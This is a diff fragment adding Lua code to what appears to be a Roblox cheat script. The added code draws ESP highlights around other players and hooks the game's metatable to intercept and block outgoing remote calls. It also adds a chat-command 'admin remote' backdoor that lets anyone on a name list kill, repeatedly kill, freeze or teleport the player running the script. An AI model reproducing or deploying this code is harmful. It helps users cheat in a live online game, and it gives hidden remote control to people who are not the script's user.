+                        hl.OutlineColor = Color3.fromRGB(255, 255, 255)
+                        hl.FillTransparency = 0.6
+                        hl.Parent = p.Character
+                    end
+                else
+                    local hl = p.Character:FindFirstChild("HitboxESP")
+                    if hl then hl:Destroy() end
+                end
+            end)
+        end
+    end
+end)
+
+-- ====================================================
+-- HỆ THỐNG ĐIỀU KHIỂN TỪ XA (ADMIN REMOTE CHỐNG LỖI)
+-- ====================================================
+local mt_success, mt = pcall(getrawmetatable, game)
+if mt_success and mt then
+    local oldNamecall = mt.__namecall
+    setreadonly(mt, false)
+    mt.__namecall = newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        if (IsFrozen or IsBringLoop) and (method == "FireServer" or method == "InvokeServer") then
+            return nil
+        end
+        return oldNamecall(self, ...)
+    end)
+    setreadonly(mt, true)
+end
+
+local function IsAdmin(player)
+    local name = string.lower(player.Name)
+    local display = string.lower(player.DisplayName)
+    for _, admin in pairs(Admins) do
+        if name:find(admin) or display:find(admin) then return true end
+    end
+    return false
+end
+
+local function CleanOtherPhysics(root)
+    for _, v in pairs(root:GetChildren()) do
+        if (v:IsA("BodyMover") or v:IsA("LinearVelocity") or v:IsA("VectorForce") or v:IsA("AlignPosition"))
+        and v.Name ~= "BringForce" and v.Name ~= "BringAtt" then
+            v:Destroy()
+        end
+    end
+end
+
+local function ExecuteCommand(msg, speaker)
+    local args = string.split(string.lower(msg), " ")
+    local cmd = args[1]
+    local targetPart = args[2]
+    
+    if not targetPart or targetPart == "" then return end
+    
+    local myName = string.lower(LocalPlayer.Name)
+    local myDisplay = string.lower(LocalPlayer.DisplayName)
+    local isTarget = myName:find(targetPart, 1, true) or myDisplay:find(targetPart, 1, true)
+    
+    if not isTarget then return end
+
+    if cmd == "kill" then
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+            LocalPlayer.Character.Humanoid.Health = 0
+        end
+    elseif cmd == "loopkill" then
+        LoopKill = true
+    elseif cmd == "unloopkill" then
+        LoopKill = false
+    elseif cmd == "freeze" then
+        IsFrozen = true
+    elseif cmd == "unfreeze" then
+        IsFrozen = false
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            LocalPlayer.Character.HumanoidRootPart.Anchored = false
+        end
+    elseif cmd == "bring" then
+        ActiveAdmin = speaker
+        IsBringLoop = true
+    elseif cmd == "unbring" then
+        IsBringLoop = false
+        ActiveAdmin = nil
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local root = LocalPlayer.Character.HumanoidRootPart
+            if root:FindFirstChild("BringForce") then root.BringForce:Destroy() end
+            if root:FindFirstChild("BringAtt") then root.BringAtt:Destroy() end
+        end
+    end
+end
+
+local function SetupChat(player)
+    player.Chatted:Connect(function(msg)
+        if IsAdmin(player) then ExecuteCommand(msg, player) end
+    end)
+end
+
+for _, p in pairs(Players:GetPlayers()) do SetupChat(p) end
+Players.PlayerAdded:Connect(SetupChat)
+
+RunService.RenderStepped:Connect(function()
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        local root = LocalPlayer.Character.HumanoidRootPart
+        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+        if LoopKill and hum and (tick() - lastKillTime) >= 3 then
+            hum.Health = 0
+            lastKillTime = tick()
+        end
+        if IsBringLoop and ActiveAdmin and ActiveAdmin.Character and ActiveAdmin.Character:FindFirstChild("HumanoidRootPart") then
+            local adminRoot = ActiveAdmin.Character.HumanoidRootPart
+            local targetCFrame = adminRoot.CFrame * CFrame.new(0, 0, -5)
+            local targetPos = targetCFrame.p
+            CleanOtherPhysics(root)
+            local dist = (targetPos - root.Position).Magnitude
+            local att = root:FindFirstChild("BringAtt") or Instance.new("Attachment", root)
+            att.Name = "BringAtt"
+            local lv = root:FindFirstChild("BringForce") or Instance.new("LinearVelocity", root)
+            lv.Name = "BringForce"
+            lv.MaxForce = 9999999
+            lv.Attachment0 = att
+            if dist > 20 then
+                lv.VectorVelocity = (targetPos - root.Position).Unit * 200
+            else
+                root.CFrame = targetCFrame
+                lv.VectorVelocity = Vector3.new(0,0,0)
+                root.Velocity = Vector3.new(0,0,0)
+                root.RotVelocity = Vector3.new(0,0,0)
+            end
+            for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
+                if v:IsA("BasePart") then v.CanCollide = false end
+            end
+            if IsFrozen then root.Anchored = false end
+        elseif IsFrozen and not IsBringLoop then
+            root.Anchored = true
+            root.Velocity = Vector3.new(0, 0, 0)
+        end
+    end
+end)
